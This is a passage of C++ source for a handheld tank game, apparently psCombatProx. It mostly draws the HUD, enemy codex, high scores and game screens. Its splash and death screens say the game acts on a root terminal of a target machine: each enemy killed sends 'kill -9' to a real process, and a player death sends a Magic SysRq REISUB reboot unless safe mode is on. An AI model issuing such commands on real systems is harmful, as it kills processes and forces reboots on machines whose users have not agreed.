        static const uint16_t PU_COLS[7] = { 0, C_PU_REPAIR, C_PU_HPUP, C_PU_FIRE, C_PU_SPREAD, C_PU_HEAVY, C_PU_SPEED };
        int xpos = AW - d.textWidth(sc) - 4;
        for (int i=_puCount-1; i>=0 && xpos > AW/2+20; i--) {
            uint8_t pt = _puStack[i];
            if (pt==0||pt>6) continue;
            int gw = d.textWidth(PU_GLYPHS[pt]);
            xpos -= gw + 2;
            d.setTextColor(PU_COLS[pt], C_HUD_BG);
            d.drawString(PU_GLYPHS[pt], xpos, PLAY_H+3);
        }
    }

    // Key status — shown on left side below HP, only when keys are active
    if (_keyActive && _numKeys > 0) {
        int kx = 2;
        d.setTextColor(C_KEY, C_HUD_BG);
        // Show collected/total
        if (_keysCollected >= _numKeys) {
            d.drawString("\x4B\x45\x59", kx, PLAY_H + 3);  // "KEY"
        } else {
            char kb[8]; snprintf(kb, sizeof(kb), "K%d/%d", _keysCollected, _numKeys);
            d.drawString(kb, kx, PLAY_H + 3);
        }
    }

    // Notification banner
    if (_notifyMsg && millis() < _notifyEnd) {
        int nw = d.textWidth(_notifyMsg);
        int ny = PLAY_H/2 - 6;
        d.fillRect(AW/2-nw/2-4, ny-2, nw+8, 12, 0x0000);
        d.setTextColor(0xFFE0, 0x0000);
        d.drawString(_notifyMsg, AW/2-nw/2, ny);
    } else {
        _notifyMsg = nullptr;
    }
}

// ---- reinforcements & kamikaze ----

void AppCombatProx::_spawnReinforcements() {
    int count = 2 + (int)(esp_random() % 4);
    int slot  = ARENA_ENEMY_COUNT;
    const uint8_t biases[5]  = { 10, 15, 20, 25, 30 };
    const uint8_t roles[5]   = { 0, 1, 2, 3, 1 };

    // Type pool scales with round — progressively harder
    static const uint8_t typePool[9][5] = {
        { ET_STANDARD,  ET_STANDARD,  ET_STANDARD,  ET_STANDARD,  ET_STANDARD  },
        { ET_SCOUT,     ET_STANDARD,  ET_STANDARD,  ET_SCOUT,     ET_STANDARD  },
        { ET_SCOUT,     ET_HEAVY,     ET_STANDARD,  ET_SNIPER,    ET_SCOUT     },
        { ET_SCOUT,     ET_HEAVY,     ET_SNIPER,    ET_HEAVY,     ET_SNIPER    },
        { ET_RUSHER,    ET_SNIPER,    ET_ARTILLERY, ET_RUSHER,    ET_BOUNCER   },
        { ET_STEALTH,   ET_RUSHER,    ET_ARTILLERY, ET_BOUNCER,   ET_STEALTH   },
        { ET_MEDIC,     ET_RUSHER,    ET_BOUNCER,   ET_STEALTH,   ET_TWINS     },
        { ET_SHIELDER,  ET_MEDIC,     ET_RUSHER,    ET_TWINS,     ET_SNIPER    },
        { ET_TWINS,     ET_SHIELDER,  ET_MEDIC,     ET_RUSHER,    ET_STEALTH   },
    };
    int ri = (_round-1); if (ri<0) ri=0; if (ri>8) ri=8;
    static const int HP_FOR_TYPE[11] = { 1, 1, 3, 1, 2, 1, 1, 1, 2, 2, 1 };

    static constexpr int INSET = CELL*2 + TANK_R;
    int spawned = 0;
    for (int i=0; i<count && slot<ENEMY_COUNT-1; i++, slot++) {
        float sx, sy;
        int edge = esp_random()%4;
        if      (edge==0) { sx=(float)(INSET+esp_random()%(VAW-INSET*2));    sy=(float)INSET; }
        else if (edge==1) { sx=(float)(INSET+esp_random()%(VAW-INSET*2));    sy=(float)(VPLAY_H-INSET); }
        else if (edge==2) { sx=(float)INSET;                                  sy=(float)(INSET+esp_random()%(VPLAY_H-INSET*2)); }
        else              { sx=(float)(VAW-INSET);                            sy=(float)(INSET+esp_random()%(VPLAY_H-INSET*2)); }
        if (sx>_camX&&sx<_camX+AW)     sx=(esp_random()&1)?(float)(_camX-TANK_R*3):(float)(_camX+AW+TANK_R*3);
        if (sy>_camY&&sy<_camY+PLAY_H) sy=(esp_random()&1)?(float)(_camY-TANK_R*3):(float)(_camY+PLAY_H+TANK_R*3);
        sx=fclamp(sx,(float)(CELL+TANK_R),(float)(VAW-CELL-TANK_R));
        sy=fclamp(sy,(float)(CELL+TANK_R),(float)(VPLAY_H-CELL-TANK_R));
        if (!_circleWall(sx, sy, TANK_R+2)) {
            uint8_t t = typePool[ri][i%5];
            _enemies[slot] = {};
            _enemies[slot].x          = sx;
            _enemies[slot].y          = sy;
            _enemies[slot].angle      = atan2f(_player.y-sy, _player.x-sx);
            _enemies[slot].hp         = HP_FOR_TYPE[t];
            _enemies[slot].aiState    = 1;
            _enemies[slot].wanderBias = biases[i%5];
            _enemies[slot].role       = roles[i%5];
            _enemies[slot].type       = t;
            spawned++;
        }
    }
    if (spawned > 0) { _notifyMsg = "Reinforcements Deployed!"; _notifyEnd = millis()+2500; }
}

void AppCombatProx::_spawnKamikaze() {
    int slot = ENEMY_COUNT-1;
    int pc = (int)(_player.x/CELL), pr = (int)(_player.y/CELL);
    int bestC=-1, bestR=-1, bestDist2=-1;
    for (int r=1; r<ROWS-1; r++)
        for (int c=1; c<COLS-1; c++) {
            if (_wallMap[r][c]) continue;
            int dc=c-pc, dr=r-pr, d2=dc*dc+dr*dr;
            if (d2 > bestDist2) { bestDist2=d2; bestC=c; bestR=r; }
        }
    float sx, sy;
    if (bestC >= 0) { sx=bestC*CELL+CELL*0.5f; sy=bestR*CELL+CELL*0.5f; }
    else {
        sx = (_player.x<VAW/2) ? (float)(VAW-TANK_R*2) : (float)(TANK_R*2);
        sy = (_player.y<VPLAY_H/2) ? (float)(VPLAY_H-TANK_R*2) : (float)(TANK_R*2);
    }
    _enemies[slot] = {};
    _enemies[slot].x       = sx;
    _enemies[slot].y       = sy;
    _enemies[slot].angle   = atan2f(_player.y-sy, _player.x-sx);
    _enemies[slot].hp      = KAMIKAZE_HP;
    _enemies[slot].aiState = 99;
    _kamikazeIdx           = slot;
    _notifyMsg = "Kamikaze Inbound!"; _notifyEnd = millis()+2500;
}

// ---- preview / splash / dead / round clear screens ----

// Draws a small simplified tank icon facing right, centred at (cx,cy).
void AppCombatProx::_drawMiniTank(int cx, int cy, uint8_t type, uint16_t col) {
    auto& d = M5Cardputer.Display;

    // Hull dimensions by type
    int hw = (type==ET_HEAVY||type==ET_ARTILLERY||type==ET_SHIELDER) ? 7 : 6;
    int hh = (type==ET_HEAVY||type==ET_ARTILLERY) ? 5 : 4;
    int trackH = 2;

    // Track colour
    uint16_t tc;
    switch (type) {
        case ET_HEAVY:     tc=0x4000; break;
        case ET_SCOUT:     tc=0x0488; break;
        case ET_SNIPER:    tc=0x7810; break;
        case ET_ARTILLERY: tc=0x8200; break;
        case ET_RUSHER:    tc=0x8400; break;
        case ET_STEALTH:   tc=0x2104; break;
        case ET_BOUNCER:   tc=0x0244; break;
        case ET_MEDIC:     tc=0x0300; break;
        case ET_SHIELDER:  tc=0x5269; break;
        case ET_TWINS:     tc=0x8008; break;
        default:           tc=0x6000; break;
    }

    // Top/bottom tracks
    d.fillRect(cx-hw, cy-(hh/2)-trackH, hw*2, trackH, tc);
    d.fillRect(cx-hw, cy+(hh/2),        hw*2, trackH, tc);
    // Hull
    d.fillRect(cx-hw, cy-(hh/2), hw*2, hh, col);

    // Turret + barrel
    int tr = (type==ET_HEAVY||type==ET_ARTILLERY||type==ET_SHIELDER) ? 3 : 2;
    uint16_t turretCol;
    switch(type) {
        case ET_HEAVY:     turretCol=0xA000; break;
        case ET_SCOUT:     turretCol=0x05FF; break;
        case ET_SNIPER:    turretCol=0xC01F; break;
        case ET_ARTILLERY: turretCol=0xFCA0; break;
        case ET_RUSHER:    turretCol=0xFFFF; break;
        case ET_STEALTH:   turretCol=0x4208; break;
        case ET_BOUNCER:   turretCol=0x07DF; break;
        case ET_MEDIC:     turretCol=0x47E0; break;
        case ET_SHIELDER:  turretCol=0xDEFB; break;
        case ET_TWINS:     turretCol=0xFC3F; break;
        default:           turretCol=0xFB00; break;
    }
    d.fillCircle(cx, cy, tr, turretCol);

    // Barrel(s)
    if (type == ET_ARTILLERY || type == ET_TWINS) {
        d.drawLine(cx+tr, cy-2, cx+hw+3, cy-2, 0xFFFF);
        d.drawLine(cx+tr, cy+2, cx+hw+3, cy+2, 0xFFFF);
    } else if (type == ET_SNIPER) {
        d.drawLine(cx+tr, cy, cx+hw+5, cy, 0xFFFF);
    } else {
        d.drawLine(cx+tr, cy, cx+hw+3, cy, 0xFFFF);
    }

    // Special markings
    if (type == ET_SHIELDER) {
        // Arc on front
        for (int dy = -4; dy <= 4; dy += 2)
            d.drawPixel(cx+hw+2, cy+dy, 0xFFFF);
    }
    if (type == ET_MEDIC) {
        d.drawLine(cx-2, cy, cx+2, cy, 0xFFFF);
        d.drawLine(cx, cy-2, cx, cy+2, 0xFFFF);
    }
    if (type == ET_STEALTH) {
        // Dashed hull to imply invisibility
        d.drawRect(cx-hw, cy-(hh/2), hw*2, hh, 0x8410);
    }
}

void AppCombatProx::_drawCodex() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextSize(1);

    // 5 pages: 4 × 3 enemies, 1 × 6 powerups (2-col)
    // Content area: y=13 to y=121 (108px). 3 rows × 36px each.
    static constexpr int HDR_Y  = 2;
    static constexpr int HDR_H  = 13;
    static constexpr int FTR_Y  = 122;
    static constexpr int ROW_H  = 36;
    static constexpr int C0_Y   = HDR_H;           // first row top
    static constexpr int TANK_X = 16;              // mini-tank centre x
    static constexpr int TEXT_X = 32;              // text start x
    static constexpr int DESC_W = AW - TEXT_X - 2; // usable desc width

    // Page titles
    static const char* TITLES[5] = {
        "ENEMIES (1/4)", "ENEMIES (2/4)", "ENEMIES (3/4)", "ENEMIES (4/4)", "POWER-UPS"
    };
    d.setTextColor(0xFFE0, 0x0000);
    d.drawString(TITLES[_codexPage], AW/2 - d.textWidth(TITLES[_codexPage])/2, HDR_Y);
    d.drawLine(0, HDR_H-1, AW, HDR_H-1, 0x2945);

    // ---- Enemy pages ----
    if (_codexPage < 4) {
        struct ERow {
            uint16_t col; uint8_t type; bool isKami;
            const char* name; const char* hp; const char* desc;
        };
        // All 12 entries across 4 pages × 3
        static const ERow ALL[12] = {
            { 0xF800, ET_STANDARD,  false, "Standard",  "1HP",
              "Balanced direct attacker. Approaches via A*, flanks by role." },
            { 0x07FF, ET_SCOUT,     false, "Scout",     "1HP",
              "Fast flanker. Fires rapid cyan bullets. Hard to track." },
            { 0x7800, ET_HEAVY,     false, "Heavy",     "3HP",
              "Slow moving tank with 3HP. Fires fat slow 2-damage shells." },
            { 0xF81F, ET_SNIPER,    false, "Sniper",    "1HP",
              "Stays at long range. Fires a fast magenta tracer round." },
            { 0xFC60, ET_ARTILLERY, false, "Artillery", "2HP",
              "Holds back and fires a 3-shot spread volley at intervals." },
            { 0xFFE0, ET_RUSHER,    false, "Rusher",    "1HP",
              "Charges at 2x speed with rapid fire. Very aggressive." },
            { 0x4208, ET_STEALTH,   false, "Stealth",   "1HP",
              "Flickers invisible every second. Only fires while hidden." },
            { 0x03EF, ET_BOUNCER,   false, "Bouncer",   "1HP",
              "Fires yellow rounds that ricochet once off walls." },
            { 0x87E0, ET_MEDIC,     false, "Medic",     "2HP",
              "Hangs back and heals the nearest damaged ally every 3s." },
            { 0xAD55, ET_SHIELDER,  false, "Shielder",  "2HP",
              "Frontal arc deflects your bullets. Flank or hit from behind." },
            { 0xFC1F, ET_TWINS,     false, "Twins",     "1HP",
              "Fires two parallel rounds simultaneously at slight offset." },
            { 0xFD20, ET_STANDARD,  true,  "Kamikaze",  "3HP",
              "Charges directly at you. Contact = instant kill. Use A*." },
        };

        int base = _codexPage * 3;
        for (int i = 0; i < 3; i++) {
            const ERow& r = ALL[base + i];
            int cy = C0_Y + i * ROW_H;

            if (i > 0) d.drawLine(0, cy, AW, cy, 0x2945);

            int ty = cy + ROW_H/2;
            _drawMiniTank(TANK_X, ty, r.type, r.col);
            if (r.isKami) {
                // X over the tank for kamikaze
                d.drawLine(TANK_X-5, ty-5, TANK_X+5, ty+5, 0xFFFF);
                d.drawLine(TANK_X+5, ty-5, TANK_X-5, ty+5, 0xFFFF);
            }

            // Name in type colour
            d.setTextColor(r.col, 0x0000);
            d.drawString(r.name, TEXT_X, cy + 2);

            // HP tag
            d.setTextColor(0x8410, 0x0000);
            d.drawString(r.hp, TEXT_X + d.textWidth(r.name) + 4, cy + 2);

            // Description — wrap onto two lines if needed
            const char* desc = r.desc;
            int dlen = (int)strlen(desc);
            int fullW = d.textWidth(desc);

            if (fullW <= DESC_W) {
                d.drawString(desc, TEXT_X, cy + 13);
            } else {
                // Find last space where line fits
                int split = -1;
                for (int k = dlen - 1; k > 0; k--) {
                    if (desc[k] == ' ') {
                        char tmp[64] = {}; int n = k < 63 ? k : 63;
                        strncpy(tmp, desc, n);
                        if (d.textWidth(tmp) <= DESC_W) { split = k; break; }
                    }
                }
                if (split > 0) {
                    char l1[64] = {}; strncpy(l1, desc, split < 63 ? split : 63);
                    d.drawString(l1,        TEXT_X, cy + 13);
                    d.drawString(desc + split + 1, TEXT_X, cy + 23);
                } else {
                    d.drawString(desc, TEXT_X, cy + 13);
                }
            }
        }
    } else {
        // ---- Power-ups page (2-column × 3-row) ----
        struct PRow {
            uint16_t col; const char* glyph; const char* name;
            const char* effect; const char* note;
        };
        static const PRow PUS[6] = {
            { 0x07E0, "+", "Repair",      "Restore 1 HP immediately",    ""             },
            { 0x07FF, "H", "Hull Up",     "Raise max HP by 1 (cap 6)",   "Permanent"    },
            { 0xFFE0, "F", "Fire Rate",   "Cut fire cooldown by 40%",    "Stacks/LIFO"  },
            { 0xFD20, "S", "Spread",      "Fire 3 bullets at once",      "Stacks/LIFO"  },
            { 0xF81F, "W", "Heavy Rounds","Bullets deal 2 damage",       "Stacks/LIFO"  },
            { 0x87FF, "V", "Speed",       "Move 30% faster",             "Stacks/LIFO"  },
        };

        // Info line
        d.setTextColor(0x8410, 0x0000);
        d.drawString("Carry over rounds. Hit = lose last pickup.", 2, HDR_H + 1);
        d.drawLine(0, HDR_H + 11, AW, HDR_H + 11, 0x2945);

        static constexpr int PU_Y0    = HDR_H + 13;
        static constexpr int PU_ROW_H = (FTR_Y - PU_Y0) / 3;  // ~33px
        static constexpr int PU_COL_W = AW / 2;

        for (int i = 0; i < 6; i++) {
            int ci = i % 2, ri = i / 2;
            int cx = ci * PU_COL_W;
            int cy = PU_Y0 + ri * PU_ROW_H;

            if (ci == 1) d.drawLine(PU_COL_W, cy, PU_COL_W, cy + PU_ROW_H, 0x2945);
            if (ri > 0)  d.drawLine(cx, cy, cx + PU_COL_W, cy, 0x2945);

            int icx = cx + 13, icy = cy + PU_ROW_H / 2;
            d.fillCircle(icx, icy, 8, PUS[i].col);
            d.setTextColor(0x0000, PUS[i].col);
            d.drawString(PUS[i].glyph, icx - d.textWidth(PUS[i].glyph)/2, icy - 4);

            d.setTextColor(PUS[i].col, 0x0000);
            d.drawString(PUS[i].name, cx + 26, cy + 3);
            d.setTextColor(0xC618, 0x0000);
            d.drawString(PUS[i].effect, cx + 26, cy + 13);
            d.setTextColor(0x8410, 0x0000);
            d.drawString(PUS[i].note,   cx + 26, cy + 23);
        }
    }

    // Footer
    d.drawLine(0, FTR_Y, AW, FTR_Y, 0x2945);
    d.setTextColor(0xFFFF, 0x0000);
    const char* footer = (_codexPage < 4) ? "ENTER=next  ESC=back" : "ENTER=play  ESC=back";
    d.drawString(footer, AW/2 - d.textWidth(footer)/2, FTR_Y + 2);
}


void AppCombatProx::_drawPreview() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    const CombatArena& arena = ARENAS[_arenaIdx];
    static constexpr int MSCALE=6, MY_OFF=7;
    d.fillRect(0, MY_OFF, 240, ROWS*MSCALE, 0x1082);
    for (int row=0; row<ROWS; row++)
        for (int col=0; col<COLS; col++)
            if (arena.walls[row][col])
                d.fillRect(col*MSCALE, MY_OFF+row*MSCALE, MSCALE, MSCALE, C_WALL);
    d.fillRect((int)(arena.playerX*0.5f)-2, MY_OFF+(int)(arena.playerY*0.5f)-2, 4, 4, C_PLAYER);
    for (int i=0; i<ARENA_ENEMY_COUNT; i++)
        d.fillRect((int)(arena.enemyX[i]*0.5f)-1, MY_OFF+(int)(arena.enemyY[i]*0.5f)-1, 3, 3, C_ENEMY);

    // Show active powerups on preview
    d.setTextSize(1);
    d.setTextColor(0xFFE0, C_BG);
    char rbuf[24]; snprintf(rbuf, sizeof(rbuf), "Round %d", _round);
    d.drawString(rbuf, AW/2-d.textWidth(rbuf)/2, 1);
    d.setTextColor(0xFFFF, C_BG);
    String sc = "Score: "+String(_score);
    d.drawString(sc, AW/2-d.textWidth(sc)/2, AH-34);

    static constexpr unsigned long PREVIEW_MS = 7000;
    unsigned long elapsed = millis()-_phaseEnter;
    int secsLeft=(int)((PREVIEW_MS-elapsed)/1000)+1;
    if (secsLeft<1) secsLeft=1;
    char buf[32]; snprintf(buf,sizeof(buf),"GET READY  %d...  ENTER to skip",secsLeft);
    d.drawString(buf, AW/2-d.textWidth(buf)/2, AH-22);
    int barW=(int)((float)(PREVIEW_MS-min(elapsed,PREVIEW_MS))/PREVIEW_MS*AW);
    d.fillRect(0, AH-8, AW-barW, 8, 0x2104);
    if (barW>0) d.fillRect(AW-barW, AH-8, barW, 8, 0x07E0);
}

void AppCombatProx::_drawSplash() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextColor(0xF800,0x0000); d.setTextSize(2);
    d.drawString("COMBAT", AW/2-d.textWidth("COMBAT")/2, 12);
    d.setTextSize(1); d.setTextColor(0xFFFF,0x0000);
    d.drawString("psCombatProx", AW/2-d.textWidth("psCombatProx")/2, 36);
    d.setTextColor(0xFFE0,0x0000);
    d.drawString("!! Open a ROOT terminal on target !!", AW/2-d.textWidth("!! Open a ROOT terminal on target !!")/2, 50);
    d.setTextColor(0x07E0,0x0000);
    d.drawString("Kill enemy -> kill -9 <real pid>", AW/2-d.textWidth("Kill enemy -> kill -9 <real pid>")/2, 64);
    d.setTextColor(0xF800,0x0000);
    d.drawString("You die   -> Magic SysRq REISUB!", AW/2-d.textWidth("You die   -> Magic SysRq REISUB!")/2, 76);
    d.setTextColor(0x8410,0x0000);
    d.drawString("up=fwd  dn=back  left=CCW  right=CW", AW/2-d.textWidth("up=fwd  dn=back  left=CCW  right=CW")/2, 90);
    d.drawString("fn/ENTER/BtnA=fire  ESC=quit", AW/2-d.textWidth("fn/ENTER/BtnA=fire  ESC=quit")/2, 102);
    d.setTextColor(0xFFFF,0x0000);
    d.drawString("Press ENTER to start", AW/2-d.textWidth("Press ENTER to start")/2, 118);
}

void AppCombatProx::_drawDead() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextSize(2); d.setTextColor(0xF800,0x0000);
    d.drawString("TANK DESTROYED", AW/2-d.textWidth("TANK DESTROYED")/2, 14);
    d.setTextSize(1); d.setTextColor(0xFFFF,0x0000);
    if (_reisub) {
        d.drawString("Magic SysRq REISUB sent!", AW/2-d.textWidth("Magic SysRq REISUB sent!")/2, 42);
        d.setTextColor(0xFC00,0x0000);
        d.drawString("R-E-I-S-U-B  System going down...", AW/2-d.textWidth("R-E-I-S-U-B  System going down...")/2, 54);
    } else {
        d.setTextColor(0xF800,0x0000);
        d.drawString("REISUB disabled (safe mode)", AW/2-d.textWidth("REISUB disabled (safe mode)")/2, 50);
    }
    d.setTextColor(0xFFE0,0x0000);
    String rnd = "Survived "+String(_round-1)+" round(s)";
    d.drawString(rnd, AW/2-d.textWidth(rnd)/2, 72);
    d.setTextColor(0x8410,0x0000);
    String sc = "Final score: "+String(_score);
    d.drawString(sc, AW/2-d.textWidth(sc)/2, 86);
    d.setTextColor(0xFFFF,0x0000);
    d.drawString("ENTER=retry   ESC=quit", AW/2-d.textWidth("ENTER=retry   ESC=quit")/2, 118);
}

void AppCombatProx::_drawRoundClear() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextSize(1);

    // Title bar
    char buf[32];
    snprintf(buf, sizeof(buf), "ROUND %d CLEARED!", _round);
    d.setTextSize(2); d.setTextColor(0x07E0, 0x0000);
    d.drawString(buf, AW/2-d.textWidth(buf)/2, 4);
    d.setTextSize(1);
    d.drawLine(0, 24, AW, 24, 0x2945);

    // Score line
    d.setTextColor(0xFFFF, 0x0000);
    snprintf(buf, sizeof(buf), "Score: %d     Round: %d", _score, _round);
    d.drawString(buf, AW/2-d.textWidth(buf)/2, 28);

    // Active powerups (compact one-liner)
    if (_puCount > 0) {
        static const char* PGLYPH[7] = {"","R","H","F","S","W","V"};
        static const uint16_t PCOL[7] = {0,C_PU_REPAIR,C_PU_HPUP,C_PU_FIRE,C_PU_SPREAD,C_PU_HEAVY,C_PU_SPEED};
        d.setTextColor(0x8410, 0x0000);
        d.drawString("Carrying:", 2, 40);
        int xp = 52;
        for (int i=0; i<_puCount && i<5; i++) {
            uint8_t pt = _puStack[i];
            if (pt==0||pt>6) continue;
            d.setTextColor(PCOL[pt], 0x0000);
            d.drawString(PGLYPH[pt], xp, 40);
            xp += 14;
        }
    }

    d.drawLine(0, 51, AW, 51, 0x2945);

    // Upcoming enemies for next round — small coloured dots + names, 2 columns
    int nextRi = _round < 5 ? _round : 5;  // cap at row 5 of type table
    struct EInfo { uint16_t col; const char* name; };
    static const EInfo einfo[11] = {
        {0xF800,"Standard"},{0x07FF,"Scout"},{0x7800,"Heavy"},{0xF81F,"Sniper"},
        {0xFC60,"Artillery"},{0xFFE0,"Rusher"},{0x4208,"Stealth"},{0x03EF,"Bouncer"},
        {0x87E0,"Medic"},{0xAD55,"Shielder"},{0xFC1F,"Twins"}
    };
    static const uint8_t NEXT_TABLE[6][3] = {
        {0,0,0},{1,0,0},{1,0,2},{1,3,2},{4,3,5},{6,7,4}
    };
    d.setTextColor(0x8410, 0x0000);
    d.drawString("Next round:", 2, 55);
    for (int i=0; i<3; i++) {
        uint8_t t = NEXT_TABLE[nextRi][i];
        int ex = 4 + (i * 78), ey = 64;
        d.fillCircle(ex+4, ey+3, 3, einfo[t].col);
        d.setTextColor(einfo[t].col, 0x0000);
        d.drawString(einfo[t].name, ex+10, ey);
    }

    d.drawLine(0, 76, AW, 76, 0x2945);

    // Next level type hint
    bool nextIsMaze = ((_round+1) >= 2 && ((_round+1) % 2 == 0));
    d.setTextColor(0x8410, 0x0000);
    snprintf(buf, sizeof(buf), "Next: %s", nextIsMaze ? "Labyrinth (find keys!)" : "Arena");
    d.drawString(buf, 2, 80);

    d.drawLine(0, 90, AW, 90, 0x2945);

    // HP status
    d.setTextColor(0xFFFF, 0x0000);
    snprintf(buf, sizeof(buf), "HP: %d/%d", _player.hp, _playerMaxHP);
    d.drawString(buf, 2, 94);

    // Footer / countdown
    static constexpr unsigned long CLEAR_MS = 5000;
    unsigned long elapsed = millis() - _phaseEnter;
    int secs = (int)((CLEAR_MS - min(elapsed, CLEAR_MS)) / 1000) + 1;
    snprintf(buf, sizeof(buf), "ENTER=continue (%ds)  ESC=quit", secs);
    d.setTextColor(0x8410, 0x0000);
    d.drawString(buf, AW/2-d.textWidth(buf)/2, 114);

    int barW = (int)((float)(CLEAR_MS - min(elapsed, CLEAR_MS)) / CLEAR_MS * AW);
    d.fillRect(0, AH-6, AW-barW, 6, 0x2104);
    if (barW > 0) d.fillRect(AW-barW, AH-6, barW, 6, 0x07E0);
}

// ---- high scores ----

void AppCombatProx::_submitFinalScore() {
    _hs.submitScore(_hsInitials, _hsFinalScore, _hsFinalRound);
    if (_hs.isOnline()) {
        _hs.startPost(_hsInitials, _hsFinalScore, _hsFinalRound);
    }
}

void AppCombatProx::_drawInitialsEntry() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextSize(1);
    d.setTextColor(0xFFE0, 0x0000);
    d.drawString("GAME OVER", AW/2 - d.textWidth("GAME OVER")/2, 4);
    d.drawLine(0, 14, AW, 14, 0x2945);

    d.setTextSize(1); d.setTextColor(0xFFFF, 0x0000);
    char buf[32];
    snprintf(buf, sizeof(buf), "Score: %d   Round: %d", _hsFinalScore, _hsFinalRound);
    d.drawString(buf, AW/2 - d.textWidth(buf)/2, 20);

    d.setTextColor(0x8410, 0x0000);
    d.drawString("Enter your initials:", AW/2 - d.textWidth("Enter your initials:")/2, 38);

    // Draw three big letter boxes
    for (int i = 0; i < 3; i++) {
        int bx = AW/2 - 40 + i * 28;
        int by = 52;
        uint16_t bc = (i == _hsCursor) ? 0xFFE0 : 0x2945;
        d.drawRect(bx, by, 22, 24, bc);
        d.setTextSize(2);
        d.setTextColor((i == _hsCursor) ? 0xFFE0 : 0xFFFF, 0x0000);
        char ch[2] = { _hsInitials[i], 0 };
        d.drawString(ch, bx + 11 - d.textWidth(ch)/2, by + 4);
        d.setTextSize(1);
    }

    d.setTextColor(0x8410, 0x0000);
    d.drawString("UP/DN=change  L/R=move  ENTER=confirm", 2, 84);

    // Rank preview
    int rank = 0;
    for (int i = 0; i < _hs.localCount(); i++)
        if (_hs.localScore(i).score < _hsFinalScore) { rank = i + 1; break; }
    if (rank == 0 && _hs.localCount() < COMBAT_MAX_LOCAL_HS)
        rank = _hs.localCount() + 1;
    if (rank > 0) {
        snprintf(buf, sizeof(buf), "Local rank: #%d", rank);
        d.setTextColor(0x07E0, 0x0000);
        d.drawString(buf, AW/2 - d.textWidth(buf)/2, 98);
    }
}

void AppCombatProx::_drawHighScores() {    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextSize(1);

    // Tab bar
    const char* tab0 = "Local";
    const char* tab1 = _hs.isOnline() ? "Online" : "Online(offline)";
    uint16_t c0 = (_hsTab == 0) ? 0xFFE0 : 0x8410;
    uint16_t c1 = (_hsTab == 1) ? 0xFFE0 : 0x8410;
    d.setTextColor(c0, 0x0000); d.drawString(tab0, 4, 2);
    d.setTextColor(c1, 0x0000); d.drawString(tab1, 60, 2);
    d.drawLine(0, 12, AW, 12, 0x2945);

    // Status
    d.setTextSize(1);
    d.setTextColor(0x8410, 0x0000);
    const char* st = _hs.statusMsg();
    if (st && *st) d.drawString(st, AW - d.textWidth(st) - 2, 2);

    // Score list
    int count  = (_hsTab == 0) ? _hs.localCount()  : _hs.onlineCount();
    int maxRow = 8;
    for (int i = 0; i < count && i < maxRow; i++) {
        const CombatScore& s = (_hsTab == 0) ? _hs.localScore(i) : _hs.onlineScore(i);
        int y = 16 + i * 13;
        char buf[40];
        snprintf(buf, sizeof(buf), "#%d  %.3s  %5d  R%d", i+1, s.initials, s.score, s.round);
        uint16_t col = (i == 0) ? 0xFFE0 : (i == 1) ? 0xC618 : (i == 2) ? 0xFC60 : 0xFFFF;
        d.setTextColor(col, 0x0000);
        d.drawString(buf, 4, y);
    }
    if (count == 0) {
        d.setTextColor(0x8410, 0x0000);
        const char* empty = (_hsTab == 1 && !_hsOnlineDone) ? "Loading..." : "No scores yet";
        d.drawString(empty, AW/2 - d.textWidth(empty)/2, 60);
    }

    d.drawLine(0, AH-13, AW, AH-13, 0x2945);
    d.setTextColor(0x8410, 0x0000);
    d.drawString("L/R=tab  ENTER=retry  ESC=quit", 2, AH-10);
}

// ---- main update ----

void AppCombatProx::onUpdate() {
    if (_phase == PH_SPLASH) {
        if (_needsRedraw) { _drawSplash(); _needsRedraw=false; }
        KeyInput ki = pollKeys();
        if (!ki.anyKey) return;
        uiManager.notifyInteraction();
        if (ki.esc)       { uiManager.returnToLauncher(); return; }
        if (ki.ch=='d')   { _reisub=!_reisub; _needsRedraw=true; return; }
        if (ki.enter)     { _codexPage=0; _phase=PH_CODEX; _phaseEnter=millis(); _needsRedraw=true; }
        return;
    }

    if (_phase == PH_CODEX) {
        if (_needsRedraw) { _drawCodex(); _needsRedraw=false; }
        if (millis() - _phaseEnter < 300) return;
        KeyInput ki = pollKeys();
        if (!ki.anyKey) return;
        uiManager.notifyInteraction();
        if (ki.esc)   { _phase=PH_SPLASH; _needsRedraw=true; return; }
        if (ki.enter || ki.fn) {
            _codexPage++;
            if (_codexPage >= 5) {
                _resetGame(); _phase=PH_PREVIEW; _phaseEnter=millis(); _needsRedraw=true;
            } else {
                _phaseEnter=millis();
                _needsRedraw=true;
            }
        }
        return;
    }

    if (_phase == PH_DEAD) {
        if (_needsRedraw) {
            _drawDead(); _needsRedraw=false;
            if (_pendingReisub) { _onPlayerDied(); _pendingReisub=false; }
        }
        KeyInput ki = pollKeys();
        if (!ki.anyKey) return;
        uiManager.notifyInteraction();
        if (ki.esc)   { _phase=PH_SPLASH; _needsRedraw=true; return; }
        if (ki.enter) {
            // Go to initials entry before showing high scores
            _hsFinalScore  = _score;
            _hsFinalRound  = _round;
            _hsCursor      = 0;
            _hsEntryDone   = false;
            _hsOnlineDone  = false;
            _hsTab         = 0;
            _hsInitials[0] = 'A'; _hsInitials[1] = 'A'; _hsInitials[2] = 'A'; _hsInitials[3] = 0;
            _phase=PH_HIGHSCORES; _phaseEnter=millis(); _needsRedraw=true;
        }
        return;
    }

    if (_phase == PH_HIGHSCORES) {
        // Poll nostr async work
        bool netDone = _hs.poll();
        if (netDone && !_hsOnlineDone) {
            _hsOnlineDone = true;
            _needsRedraw = true;
        }

        if (_needsRedraw) {
            if (!_hsEntryDone) _drawInitialsEntry();
            else               _drawHighScores();
            _needsRedraw = false;
        }

        KeyInput ki = pollKeys();
        if (!ki.anyKey) return;
        uiManager.notifyInteraction();

        if (!_hsEntryDone) {
            // Arrow keys change/move; direct letter keys type
            if (ki.arrowUp) {
                _hsInitials[_hsCursor] = (_hsInitials[_hsCursor] == 'Z') ? 'A' :
                                          (_hsInitials[_hsCursor] + 1);
                _needsRedraw = true;
            }
            if (ki.arrowDown) {
                _hsInitials[_hsCursor] = (_hsInitials[_hsCursor] == 'A') ? 'Z' :
                                          (_hsInitials[_hsCursor] - 1);
                _needsRedraw = true;
            }
